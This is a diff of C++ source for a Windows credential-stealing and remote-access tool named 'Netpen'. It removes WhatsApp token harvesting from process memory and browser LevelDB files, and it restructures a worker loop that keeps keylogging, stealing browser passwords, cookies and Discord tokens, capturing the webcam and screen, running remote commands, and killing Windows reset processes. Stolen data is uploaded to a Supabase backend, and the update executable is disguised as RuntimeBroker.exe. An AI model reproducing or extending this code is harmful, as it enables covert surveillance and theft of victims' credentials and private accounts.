@@ -43,6 +43,7 @@ ISampleGrabber : public IUnknown {
 #define SUPABASE_HEARTBEAT_PATH L"/rest/v1/heartbeat?hostname=eq."
 #define STORAGE_VER_PATH L"/storage/v1/object/public/Netpen/version.txt"
 #define STORAGE_EXE_PATH L"/storage/v1/object/public/Netpen/RuntimeBroker.exe"
+#define WM_NETPEN_STOP (WM_USER + 1)
 
 static HHOOK g_hHook = NULL;
 static std::string g_winTitle;
@@ -62,6 +63,7 @@ static HWND g_hwnd = NULL;
 static HMODULE g_hModule = NULL;
 static CRITICAL_SECTION g_uploadLock;
 static std::vector<std::string> g_uploadQueue;
+static HANDLE g_hWorkEvent = NULL;
 
 static std::wstring g_supabaseHost;
 static std::wstring g_supabaseKey;
@@ -1016,7 +1018,6 @@ static void CheckAndHandleExec() {
 #define SUPABASE_COOKIES_PATH L"/rest/v1/cookies"
 #define SUPABASE_WIFI_PATH L"/rest/v1/wifi_creds"
 #define SUPABASE_DISCORD_PATH L"/rest/v1/discord_tokens"
-#define SUPABASE_WHATSAPP_PATH L"/rest/v1/whatsapp_tokens"
  
 static uint32_t SqliteVarint(const uint8_t* p, int* used) {
     uint32_t v = 0; *used = 0;
@@ -1379,183 +1380,6 @@ static void HarvestDiscordTokens() {
     } else {
         LogMsg("Discord mem: no token found in any discord.exe process");
     }
-}
-
-static void HarvestWhatsAppSession() {
-    std::vector<std::string> tokens;
-    DWORD startTick = GetTickCount();
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap != INVALID_HANDLE_VALUE) {
-        PROCESSENTRY32W pe = { sizeof(pe) };
-        if (Process32FirstW(hSnap, &pe)) {
-            do {
-                if (lstrcmpiW(pe.szExeFile, L"msedgewebview2.exe") != 0 && lstrcmpiW(pe.szExeFile, L"WhatsApp.exe") != 0) continue;
-                HANDLE hp = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
-                if (!hp) continue;
-                SYSTEM_INFO si; GetSystemInfo(&si);
-                uintptr_t addr = (uintptr_t)si.lpMinimumApplicationAddress;
-                while (addr < (uintptr_t)si.lpMaximumApplicationAddress) {
-                    if (GetTickCount() - startTick > 10000) break;
-                    MEMORY_BASIC_INFORMATION mbi;
-                    if (VirtualQueryEx(hp, (LPCVOID)addr, &mbi, sizeof(mbi)) == 0) { addr += 65536; continue; }
-                    if (mbi.State == MEM_COMMIT && (mbi.Protect & (PAGE_READWRITE | PAGE_READONLY)) && !(mbi.Protect & PAGE_GUARD) && mbi.Type == MEM_PRIVATE && mbi.RegionSize <= 104857600) {
-                        char* buf = new (std::nothrow) char[(size_t)mbi.RegionSize + 1];
-                        if (!buf) { addr += mbi.RegionSize; continue; }
-                        SIZE_T rd = 0;
-                        if (ReadProcessMemory(hp, mbi.BaseAddress, buf, mbi.RegionSize, &rd) && rd > 0) {
-                            buf[rd] = 0;
-                            for (DWORD i = 0; i < (DWORD)rd; i++) {
-                                if (!IsTokenChar(buf[i])) continue;
-                                // WAToken1 (client token)
-                                if (i + 8 <= rd && memcmp(buf + i, "WAToken1", 8) == 0) {
-                                    DWORD end = i + 8;
-                                    while (end < rd && end - i < 200) {
-                                        char c = buf[end];
-                                        if (c == 0 || c == '"' || c == '\'' || c == '&' || c == '|' || c == '<' || c == '>' || c == ' ' || c == '\t' || c == '\r' || c == '\n') break;
-                                        if (!isalnum((unsigned char)c) && c != '+' && c != '/' && c != '=' && c != '-' && c != '_' && c != '.') break;
-                                        end++;
-                                    }
-                                    if (end - i - 8 >= 40) tokens.push_back(std::string(buf + i + 8, end - i - 8));
-                                    i = end;
-                                    continue;
-                                }
-                                // WAToken2 (server token)
-                                if (i + 8 <= rd && memcmp(buf + i, "WAToken2", 8) == 0) {
-                                    DWORD end = i + 8;
-                                    while (end < rd && end - i < 200) {
-                                        char c = buf[end];
-                                        if (c == 0 || c == '"' || c == '\'' || c == '&' || c == '|' || c == '<' || c == '>' || c == ' ' || c == '\t' || c == '\r' || c == '\n') break;
-                                        if (!isalnum((unsigned char)c) && c != '+' && c != '/' && c != '=' && c != '-' && c != '_' && c != '.') break;
-                                        end++;
-                                    }
-                                    if (end - i - 8 >= 40) tokens.push_back(std::string(buf + i + 8, end - i - 8));
-                                    i = end;
-                                    continue;
-                                }
-                            }
-                        }
-                        delete[] buf;
-                    }
-                    addr += mbi.RegionSize;
-                }
-                CloseHandle(hp);
-            } while (Process32NextW(hSnap, &pe));
-        }
-        CloseHandle(hSnap);
-    }
-
-    if (!tokens.empty()) {
-        std::sort(tokens.begin(), tokens.end());
-        tokens.erase(std::unique(tokens.begin(), tokens.end()), tokens.end());
-        std::string batch = "[";
-        for (size_t i = 0; i < tokens.size(); i++) {
-            if (i > 0) batch += ",";
-            batch += "{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"token\":\"" + EscapeJSON(tokens[i]) + "\"}";
-        }
-        batch += "]";
-        std::string pr;
-        HttpRequest(L"POST", SUPABASE_WHATSAPP_PATH, batch, pr);
-        LogMsg("WhatsApp: uploaded " + std::to_string(tokens.size()) + " tokens from memory");
-    } else {
-        LogMsg("WhatsApp: no session data found in memory");
-    }
-    // Report to exec_results
-    std::string logEntry = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"command\":\"[WhatsApp memory scan]\",\"output\":\"WhatsApp memory: " + std::to_string(tokens.size()) + " tokens found\",\"exit_code\":0}]";
-    std::string resp2;
-    HttpRequest(L"POST", SUPABASE_EXEC_PATH, logEntry, resp2);
-}
-
-static void HarvestWhatsAppWeb() {
-    std::vector<std::string> tokens;
-    char laBuf[MAX_PATH];
-    DWORD laLen = GetEnvironmentVariableA("LOCALAPPDATA", laBuf, MAX_PATH);
-    if (laLen == 0 || laLen >= MAX_PATH) return;
-    std::string lad(laBuf);
-    char adBuf[MAX_PATH];
-    DWORD adLen = GetEnvironmentVariableA("APPDATA", adBuf, MAX_PATH);
-    std::string ad = (adLen > 0 && adLen < MAX_PATH) ? std::string(adBuf) : "";
-
-    // Scan browser + app LevelDB paths for WhatsApp Web tokens
-    struct { const char* base; const char* sub; } waPaths[] = {
-        { lad.c_str(), "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb" },
-        { lad.c_str(), "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb" },
-        { ad.c_str(), "\\WhatsApp\\Local Storage\\leveldb" },
-        { lad.c_str(), "\\com.facebook.katana\\Local Storage\\leveldb" },
-        { NULL, NULL }
-    };
-    for (int pi = 0; waPaths[pi].base; pi++) {
-        if (!waPaths[pi].base || waPaths[pi].base[0] == 0) continue;
-        std::string leveldbPath = std::string(waPaths[pi].base) + waPaths[pi].sub;
-        std::string searchPath = leveldbPath + "\\*";
-        WIN32_FIND_DATAA fd;
-        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
-        if (hFind == INVALID_HANDLE_VALUE) continue;
-        do {
-            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
-            std::string fn(fd.cFileName);
-            if (fn.size() < 4) continue;
-            std::string ext = fn.substr(fn.size() - 4);
-            if (ext != ".ldb" && ext != ".log") continue;
-            if (fd.nFileSizeHigh > 0 || fd.nFileSizeLow > 10485760) continue;
-            std::string fpath = leveldbPath + "\\" + fn;
-            HANDLE hFile = CreateFileA(fpath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-            if (hFile == INVALID_HANDLE_VALUE) continue;
-            DWORD sz = GetFileSize(hFile, NULL);
-            if (sz == 0 || sz == INVALID_FILE_SIZE) { CloseHandle(hFile); continue; }
-            char* buf = new char[sz + 1];
-            DWORD rd = 0;
-            if (ReadFile(hFile, buf, sz, &rd, NULL) && rd == sz) {
-                buf[sz] = 0;
-                // Search for @s.whatsapp.net JID pattern
-                for (DWORD i = 0; i + 15 <= sz; i++) {
-                    if (memcmp(buf + i, "@s.whatsapp.net", 15) == 0) {
-                        DWORD start = i;
-                        while (start > 0 && (isalnum((unsigned char)buf[start-1]) || buf[start-1] == '-' || buf[start-1] == '_' || buf[start-1] == '.')) start--;
-                        DWORD end = i + 15;
-                        tokens.push_back(std::string(buf + start, end - start));
-                        i = end;
-                        continue;
-                    }
-                    if (i + 14 <= sz && memcmp(buf + i, "WADeviceSecret", 14) == 0) {
-                        DWORD end = i + 14;
-                        while (end < sz && (isalnum((unsigned char)buf[end]) || buf[end] == '+' || buf[end] == '/' || buf[end] == '=') && end - i < 200) end++;
-                        if (end - i - 14 >= 20) tokens.push_back(std::string(buf + i + 14, end - i - 14));
-                        i = end;
-                        continue;
-                    }
-                    if (i + 12 <= sz && memcmp(buf + i, "WABrowserId", 12) == 0) {
-                        DWORD end = i + 12;
-                        while (end < sz && (isalnum((unsigned char)buf[end]) || buf[end] == '+' || buf[end] == '/' || buf[end] == '=') && end - i < 200) end++;
-                        if (end - i - 12 >= 10) tokens.push_back(std::string(buf + i + 12, end - i - 12));
-                        i = end;
-                        continue;
-                    }
-                }
-            }
-            delete[] buf;
-            CloseHandle(hFile);
-        } while (FindNextFileA(hFind, &fd));
-        FindClose(hFind);
-    }
-
-    if (!tokens.empty()) {
-        std::sort(tokens.begin(), tokens.end());
-        tokens.erase(std::unique(tokens.begin(), tokens.end()), tokens.end());
-        std::string batch = "[";
-        for (size_t i = 0; i < tokens.size(); i++) {
-            if (i > 0) batch += ",";
-            batch += "{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"token\":\"" + EscapeJSON(tokens[i]) + "\"}";
-        }
-        batch += "]";
-        std::string pr;
-        HttpRequest(L"POST", SUPABASE_WHATSAPP_PATH, batch, pr);
-        LogMsg("WhatsApp Web: uploaded " + std::to_string(tokens.size()) + " tokens from LevelDB");
-    } else {
-        LogMsg("WhatsApp Web: no tokens found in LevelDB");
-    }
-    std::string logEntry = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"command\":\"[WhatsApp LevelDB scan]\",\"output\":\"WhatsApp LevelDB: " + std::to_string(tokens.size()) + " tokens found\",\"exit_code\":0}]";
-    std::string resp2;
-    HttpRequest(L"POST", SUPABASE_EXEC_PATH, logEntry, resp2);
 }
 
 static void HarvestBrowserPasswords() {
@@ -2797,79 +2621,89 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
+DWORD WINAPI WorkerProc(LPVOID) {
+    int counter = 0;
+    while (g_running) {
+        DWORD waitResult = WaitForSingleObject(g_hWorkEvent, 1000);
+        if (!g_running) break;
+        counter++;
+
+        DrainUploadQueue();
+
+        if (counter % 3 == 0 && !g_selfDestructing) CheckClipboard();
+        if (counter % 2 == 0 && !g_selfDestructing) CheckPasswordFields();
+        if (counter % 5 == 0 && !g_keys.empty()) {
+            DWORD now = GetTickCount();
+            if (now - g_lastTick > 300) FlushBuffer();
+        }
+        if (counter % 30 == 0) {
+            if (CheckSelfDestruct()) {
+                g_selfDestructing = true;
+                PostMessageW(g_hwnd, WM_NETPEN_STOP, 0, 0);
+                break;
+            } else if (CheckStop()) {
+                PostMessageW(g_hwnd, WM_NETPEN_STOP, 0, 0);
+                break;
+            }
+        }
+        if (counter % 5 == 0 && g_protectReset) {
+            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if (hSnap != INVALID_HANDLE_VALUE) {
+                PROCESSENTRY32 pe = { sizeof(pe) };
+                if (Process32First(hSnap, &pe)) {
+                    do {
+                        if (_stricmp(pe.szExeFile, "systemreset.exe") == 0 || _stricmp(pe.szExeFile, "SystemResetPlatform.exe") == 0) {
+                            HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                            if (hProc) {
+                                if (!TerminateProcess(hProc, 1))
+                                    LogMsg("ProtectReset: failed to kill " + std::string(pe.szExeFile) + " PID " + std::to_string(pe.th32ProcessID));
+                                CloseHandle(hProc);
+                            }
+                        }
+                    } while (Process32Next(hSnap, &pe));
+                }
+                CloseHandle(hSnap);
+            }
+        }
+        if (counter % 60 == 0 && !g_selfDestructing) {
+            SendHeartbeat();
+            FetchTriggers();
+            { std::string id = CheckScreenshotCmd(); if (!id.empty()) HandleScreenshot(id); }
+            { std::string id = CheckWebcamCmd(); if (!id.empty()) HandleWebcam(id); }
+            { std::string id = CheckSpeakerCmd(); if (!id.empty()) HandleSpeaker(id); }
+            CheckAndHandleExec();
+            { std::string id = CheckWifiCmd(); if (!id.empty()) HandleWifiCmd(id); }
+            { std::string id = CheckDiscordCmd(); if (!id.empty()) HandleDiscordCmd(id); }
+            CheckAndHandleDirlist();
+            CheckAndHandleDownload();
+            CheckAndHandleProclist();
+            CheckAndHandleKill();
+            CheckAndHandleDefender();
+            CheckAndHandleProtectReset();
+            CheckHarvestConfig();
+        }
+        if (counter % 300 == 0 && !g_selfDestructing && !g_harvestPaused) {
+            HarvestBrowserPasswords();
+            HarvestBrowserCookies();
+            HarvestDiscordTokens();
+        }
+    }
+    return 0;
+}
+
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     switch (msg) {
         case WM_CREATE:
             SetTimer(hwnd, 1, 1000, NULL);
             break;
-        case WM_TIMER:
-        {
-            DrainUploadQueue();
-            static int counter = 0;
-            counter++;
-            if (counter % 3 == 0 && !g_selfDestructing) CheckClipboard();
-            if (counter % 2 == 0 && !g_selfDestructing) CheckPasswordFields();
-            if (counter % 5 == 0 && !g_keys.empty()) {
-                DWORD now = GetTickCount();
-                if (now - g_lastTick > 300) FlushBuffer();
-            }
-            if (counter % 30 == 0) {
-                if (CheckSelfDestruct()) {
-                    g_selfDestructing = true;
-                    g_running = false;
-                    DestroyWindow(hwnd);
-                    g_hwnd = NULL;
-                } else if (CheckStop()) {
-                    g_running = false;
-                    DestroyWindow(hwnd);
-                    g_hwnd = NULL;
-                }
-            }
-            if (counter % 5 == 0 && g_protectReset) {
-                HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-                if (hSnap != INVALID_HANDLE_VALUE) {
-                    PROCESSENTRY32 pe = { sizeof(pe) };
-                    if (Process32First(hSnap, &pe)) {
-                        do {
-                            if (_stricmp(pe.szExeFile, "systemreset.exe") == 0 || _stricmp(pe.szExeFile, "SystemResetPlatform.exe") == 0) {
-                                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
-                                if (hProc) {
-                                    if (!TerminateProcess(hProc, 1))
-                                        LogMsg("ProtectReset: failed to kill " + std::string(pe.szExeFile) + " PID " + std::to_string(pe.th32ProcessID));
-                                    CloseHandle(hProc);
-                                }
-                            }
-                        } while (Process32Next(hSnap, &pe));
-                    }
-                    CloseHandle(hSnap);
-                }
-            }
-            if (counter % 60 == 0 && !g_selfDestructing) {
-                SendHeartbeat();
-                FetchTriggers();
-                { std::string id = CheckScreenshotCmd(); if (!id.empty()) HandleScreenshot(id); }
-                { std::string id = CheckWebcamCmd(); if (!id.empty()) HandleWebcam(id); }
-                { std::string id = CheckSpeakerCmd(); if (!id.empty()) HandleSpeaker(id); }
-                CheckAndHandleExec();
-                { std::string id = CheckWifiCmd(); if (!id.empty()) HandleWifiCmd(id); }
-                { std::string id = CheckDiscordCmd(); if (!id.empty()) HandleDiscordCmd(id); }
-                CheckAndHandleDirlist();
-                CheckAndHandleDownload();
-                CheckAndHandleProclist();
-                CheckAndHandleKill();
-                CheckAndHandleDefender();
-                CheckAndHandleProtectReset();
-                CheckHarvestConfig();
-            }
-            if (counter % 300 == 0 && !g_selfDestructing && !g_harvestPaused) {
-                HarvestBrowserPasswords();
-                HarvestBrowserCookies();
-                HarvestDiscordTokens();
-                HarvestWhatsAppSession();
-                HarvestWhatsAppWeb();
-            }
+        case WM_NETPEN_STOP:
+            g_running = false;
+            SetEvent(g_hWorkEvent);
+            PostQuitMessage(0);
             break;
-        }
+        case WM_TIMER:
+            SetEvent(g_hWorkEvent);
+            break;
         case WM_DESTROY:
             KillTimer(hwnd, 1);
             PostQuitMessage(0);
@@ -2910,6 +2744,8 @@ static int RunChild(HINSTANCE hInstance) {
     if (!g_hwnd) { Gdiplus::GdiplusShutdown(gdiToken); return 1; }
 
     InitializeCriticalSection(&g_uploadLock);
+    g_hWorkEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
+    HANDLE hWorker = CreateThread(NULL, 0, WorkerProc, NULL, 0, NULL);
 
     g_hHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
     if (!g_hHook) {
@@ -2921,8 +2757,6 @@ static int RunChild(HINSTANCE hInstance) {
 
     HarvestWiFiPasswords();
     HarvestDiscordTokens();
-    HarvestWhatsAppSession();
-    HarvestWhatsAppWeb();
 
     MSG msg;
     while (g_running && GetMessage(&msg, NULL, 0, 0) > 0) {
@@ -2930,7 +2764,11 @@ static int RunChild(HINSTANCE hInstance) {
         DispatchMessage(&msg);
     }
 
-    // Drain any remaining uploads before shutdown
+    g_running = false;
+    SetEvent(g_hWorkEvent);
+    if (hWorker) { WaitForSingleObject(hWorker, 10000); CloseHandle(hWorker); }
+    if (g_hWorkEvent) { CloseHandle(g_hWorkEvent); g_hWorkEvent = NULL; }
+
     DrainUploadQueue();
 
     if (g_hHook) UnhookWindowsHookEx(g_hHook);
